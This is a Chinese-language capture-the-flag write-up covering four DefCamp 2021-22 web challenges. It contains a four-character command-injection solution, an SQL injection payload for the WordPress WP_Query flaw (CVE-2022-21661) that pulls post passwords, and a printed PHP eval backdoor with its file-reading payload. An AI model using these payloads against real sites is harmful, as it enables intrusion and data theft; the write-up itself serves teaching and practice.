---
title: DefCamp CTF(D-CTF)2021-22 web
categories: 赛题wp
---

# 前言
抽空看了下web，躺了个45，弄的还挺好看 :)

![](https://img-blog.csdnimg.cn/52042f067de34ac2905c3c9ce3661cd2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

<!--more-->

# para-code

**4长度rce需要有写权限**，但是题目没有写权限，只能爆破一下后面的命令
```php
<?php
require __DIR__ . '/flag.php';
if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 

$blackList = array(
  'ss','sc','aa','od','pr','pw','pf','ps','pa','pd','pp','po','pc','pz','pq','pt','pu','pv','pw','px','ls','dd','nl','nk','df','wc', 'du'
);

$valid = true;
foreach($blackList as $blackItem)
{
    if(strpos($_GET['start'], $blackItem) !== false)
    {
         $valid = false;
         break;
    }
}

if(!$valid)
{
  show_source(__FILE__);
  exit;
}

// This will return output only for id and ps. 
if (strlen($_GET['start']) < 5){
  echo shell_exec($_GET['start']);
} else {
  echo "Please enter a valid command";
}

if (False) {
  echo $flag;
}
?>
```
最后爆破出为 `?start=m4 *`

linux m4 命令

>m4 将输入拷贝到输出,同时将宏展开. 宏可以是内嵌的也可以是用户定义的. 除了可以展开宏,m4还有一些内建的函数,用来引用文件,执行Unix命令,整数运算,文本操作,循环等. m4既可以作为编译器的前端也可以单独作为一个宏处理器。

# research-it
一个wordpress站点，经过扫描 `/wp-content/plugins/` 存在目录遍历

![](https://img-blog.csdnimg.cn/baffef8cdef64e35bce84bfc66e5fb2f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

**wp-content** 下面的文件目录

1.	languages(语言包,中文什么的，可以安装其他语言包，也放这里)
2.	plugins(各种插件，比如301插件，回复插件，自动邮件插件什么的)
3.	themes(最新版本的wordpress默认有3个主题都是放这里，自己安装的主题也是放这里的)

wp-content下面一共就这3个目录

![](https://img-blog.csdnimg.cn/94f604748bd647bf8b0f9118e0bdf042.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

**/wp-includes/wlwmanifest.xml** 获得后台地址

![](https://img-blog.csdnimg.cn/f5e65be687b5470eb51f5128c1289a0f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

尝试了一些基本的wordpress的漏洞均失败，突破点 hello.php存在备份文件能查看源码 `hello.php~`

发现了WP_Query ，前一段时间爆出一个sql注入 `CVE-2022–21661`

分析文章：[某Press核心框架WP_Query SQL注入漏洞分析(CVE-2022–21661)](https://xz.aliyun.com/t/10841)

![](https://img-blog.csdnimg.cn/603d9e20fdb646e5ab291de82058f421.png#pic_center)

发现 **add 的 action**

![](https://img-blog.csdnimg.cn/d6418e81755549c58ab13cad767e6ef2.png#pic_center)

有点不同的是，网上的poc是采用 `json方式注入`，这里改一下就完事了

payload：
```
action=Taxonomy&args[tax_query][0][field]=term_taxonomy_id&args[tax_query][0][terms][0]=1) and extractvalue(1,co
ncat(0x5e,(select substr((select group_concat(post_password) from wp_posts),10,40)),0x5e))#
```

![](https://img-blog.csdnimg.cn/ae8da66d57e44459a312c9f060da8c99.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)



# casual-defence

首页

![](https://img-blog.csdnimg.cn/2c2b7c790b2947039aeb300134b14df7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
一开始什么线索都没有，尝试apache的漏洞也没有成功，最后通过`dirsearch` 发现了一个疑点，访问 `index.php时返回还是这个页面`，说明后端为php，然后结合题目，网站被黑，**怀疑存在后门函数**，只不过需要自己 **fuzz参数**，经过手动 fuzz，发现存在cmd参数命令执行，用Wfuzz也能出参数

![](https://img-blog.csdnimg.cn/64ea27083dbf4e51baccf33cf5d16ace.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

Disable_function:

```
eval,passthru,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,shell_exec,get_defined_functions
```
发现执行了 ban了 eval，那么就是用了`assert`，php7环境下，无参读文件，取反也行

payload
```
?cmd=var_dump(file_get_contents(end(current(get_defined_vars()))));&y0ng=index.php
```

源码：
```php
<?php
$note = "most of execution functions where blocked within the php.ini :D";
	
if (!isset($_GET['cmd'])){
	echo 'Hacked by NotRealH4ck3rN4m3! You shall not elevate me!';
} 
	
if(preg_match('/system|exec|passthru|shell|[\"\'\\\$\%\.\[\]\{\}\`\!\*\/]/', $_GET['cmd'])){
	echo "Try Harder!";
} else {
	eval($_GET['cmd']);
}
$flag = "CTF{40c7bf1cd2186ce4f14720c4243f1e276a8abe49004b788921828f13a026c5f1}";
?>
```

然后发现用的是 `eval` ，不是ban了吗，网上查到的原因：

>在php.ini中，有个disable_functions项目，可以用于设置要禁用的php函数。但是却不能禁用eval函数。是因为eval并不是php的函数，而是zend的函数。

要想禁用eval函数需要使用 `Suhosin` php插件，[php 禁用eval( )函数](https://www.cnblogs.com/mr-amazing/p/5501872.html)

# it-support
首页：Laravel v8.83.0 (PHP v7.3.33)

![](https://img-blog.csdnimg.cn/2eda545195df4472abceabc4a7fd96a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

提交抓包：

![](https://img-blog.csdnimg.cn/40e7a2a1732246ec99fbf270141a80cc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

测出xss，但是貌似没什么用

![](https://img-blog.csdnimg.cn/6431b7e5d29b4a53a7f6363499edaeda.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

观察生成的ticket

![](https://img-blog.csdnimg.cn/8d7e2a7cec7c474294fdc43e7fbf1f47.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)

这个是ticket的格式是这样的：TK-(year)(month)(day)(minutes)(second)-1xxx

当我刷新页面时只有时间和状态发生了变化，时间有大概两三秒的差别，状态从penting变为closed

![](https://img-blog.csdnimg.cn/e4e1554f694241b09b64743b0bb85523.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_15,color_FFFFFF,t_70,g_se,x_16#pic_center)

然后就是一直爆破 ticket 的秒和后面的1xxx，我没爆出来
